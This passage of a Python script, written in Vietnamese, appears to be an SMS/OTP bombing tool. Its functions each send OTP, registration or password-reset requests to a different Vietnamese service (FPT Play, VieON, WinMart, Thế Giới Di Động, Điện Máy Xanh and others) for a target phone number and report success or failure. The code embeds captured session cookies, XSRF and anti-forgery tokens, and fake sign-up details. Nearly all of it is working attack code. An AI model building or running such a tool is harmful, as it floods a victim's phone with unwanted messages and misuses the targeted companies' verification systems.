        'X-XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }

    try:
        response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDICARE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDICARE | TRẠNG THÁI : THẤT BẠI")

def tokyolife():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'priority': 'u=1, i',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'signature': '260a5bdf2a783bc889dcf22852ff0c5e',
        'timestamp': '1721494339686',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
        'name': 'tran th1nk',
        'password': '123123123a',
        'email': 'ret43ht6@gmail.com',
        'birthday': '2003-10-01',
        'gender': 'male',
    }

    try:
        response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TOKYOLIFE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TOKYOLIFE | TRẠNG THÁI : THẤT BẠI")

def vion():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VION | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VION | TRẠNG THÁI : THẤT BẠI")

def fptreg():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=EtZ0F4nqKi0D0l5lvM5Vlw&e=1721529198&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTREG | TRẠNG THÁI : THÀNH CÔNG");print(response.text)
    except requests.exceptions.RequestException:
        print("FPTREG | TRẠNG THÁI : THẤT BẠI")

def fptreset():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=Mp8U7wZGJe0SNpw7eyiZ4g&e=1721529690&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTRESET | TRẠNG THÁI : THẤT BẠI")

def fptresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'email': '',
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp?st=q-xLREdlNXduE2Bt-ILubw&e=1721530087&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTRESEND | TRẠNG THÁI : THẤT BẠI")

def winmart():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'tran tranh',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '1996-07-12',
        'gender': 'Male',
    }

    try:
        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WINMART | TRẠNG THÁI : THẤT BẠI")

def tgdidong():
    cookies = {
        '_ga': 'GA1.1.383137769.1707219496',
        '_pk_id.7.8f7e': '98ddc5d43340bec9.1707219498.',
        '_tt_enable_cookie': '1',
        '_ttp': 'lc7jJkDQUTphqZNKGUgbp4UXsVT',
        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
        '_gcl_au': '1.1.1960895612.1715007168',
        '_ce.s': 'v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560',
        '___utmvm': '###########',
        'ASP.NET_SessionId': 'kkussnf30znrftqduwbdzoaz',
        '_fbp': 'fb.1.1719755336237.751784073551657802',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1',
        '_ga_TLRZMSX5ME': 'GS1.1.1719755335.46.1.1719755823.59.0.0',
        '__RequestVerificationToken_L2dhbWUtYXBw0': 'rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1',
        'TBMCookie_3209819802479625248': '704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8',
        'SvID': 'beline2682|Zpxsx|ZpxsL',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_ga=GA1.1.383137769.1707219496; _pk_id.7.8f7e=98ddc5d43340bec9.1707219498.; _tt_enable_cookie=1; _ttp=lc7jJkDQUTphqZNKGUgbp4UXsVT; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1960895612.1715007168; _ce.s=v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560; ___utmvm=###########; ASP.NET_SessionId=kkussnf30znrftqduwbdzoaz; _fbp=fb.1.1719755336237.751784073551657802; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1; _ga_TLRZMSX5ME=GS1.1.1719755335.46.1.1719755823.59.0.0; __RequestVerificationToken_L2dhbWUtYXBw0=rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1; TBMCookie_3209819802479625248=704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8; SvID=beline2682|Zpxsx|ZpxsL',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNmcyxqfG4iox8M-NAgV5Q8ffXIQLpqWRkUg7FNMCcXbDGttXTUOUmdIpQ_KvOdMghelaFFw19tC0tdNruWUKkJSdyIXgff-CzqyfSx-6wOmYxTRqCMnxQsHfxdy9qova8',
    }

    try:
        response = requests.post(
            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TGDIDONG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TGDIDONG | TRẠNG THÁI : THẤT BẠI")

def dienmayxanh():
    cookies = {
        '_ga': 'GA1.1.939547831.1707797103',
        '_pk_id.8.8977': 'e802b602f6107cf3.1707797103.',
        '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_ga_Y7SWKJEHCE': 'GS1.1.1715006306.6.1.1715006470.35.0.0',
        '_ce.s': 'v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672',
        'DMX_View': 'DESKTOP',
        'DMX_Personal': '%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d',
        '___utmvm': '###########',
        'TBMCookie_3209819802479625248': '776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'new2693|ZpxwU|ZpxwT',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "_ga=GA1.1.939547831.1707797103; _pk_id.8.8977=e802b602f6107cf3.1707797103.; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _ga_Y7SWKJEHCE=GS1.1.1715006306.6.1.1715006470.35.0.0; _ce.s=v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672; DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d; ___utmvm=###########; TBMCookie_3209819802479625248=776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=new2693|ZpxwU|ZpxwT; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU",
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TT5ZU_rJVhy8x3F_L2DiqjDc1L_VRbJiGtF6nRoVvDLPby5ttmADmlIwjASFbRoQXmnFIpyCwkWErImoHvqHc6D1Vb9shU3Z3n67mDZCKqSmU5PWGqoH6wMh-UqswE9EQ',
    }

    try:
        response = requests.post(
            'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DIENMAYXANH | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DIENMAYXANH | TRẠNG THÁI : THẤT BẠI")

def meta():
    cookies = {
        '_ssid': 'kfeiac30ctlo2jkxrl4b2gls',
        '__ckref': 'performance-sale',
        '_cart_': '0ea51858-1f80-4165-8840-74939d5e3d75',
        '__ckmid': '0e43463633164e028245b4bf873328d6',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_ssid=kfeiac30ctlo2jkxrl4b2gls; __ckref=performance-sale; _cart_=0ea51858-1f80-4165-8840-74939d5e3d75; __ckmid=0e43463633164e028245b4bf873328d6',
        'origin': 'https://meta.vn',
        'priority': 'u=1, i',
        'referer': 'https://meta.vn/account/register?ReturnUrl=/account/history',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'api_mode': '1',
    }

    json_data = {
        'api_args': {
            'lgUser': sdt,
            'type': 'phone',
        },
        'api_method': 'CheckRegister',
    }

    try:
        response = requests.post(
            'https://meta.vn/app_scripts/pages/AccountReact.aspx',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("META | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("META | TRẠNG THÁI : THẤT BẠI")

def thefaceshop():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'cf709515be3685bb734f1c6bcb30bffc',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721530092656',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THEFACESHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THEFACESHOP | TRẠNG THÁI : THẤT BẠI")

def bestexpress():
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
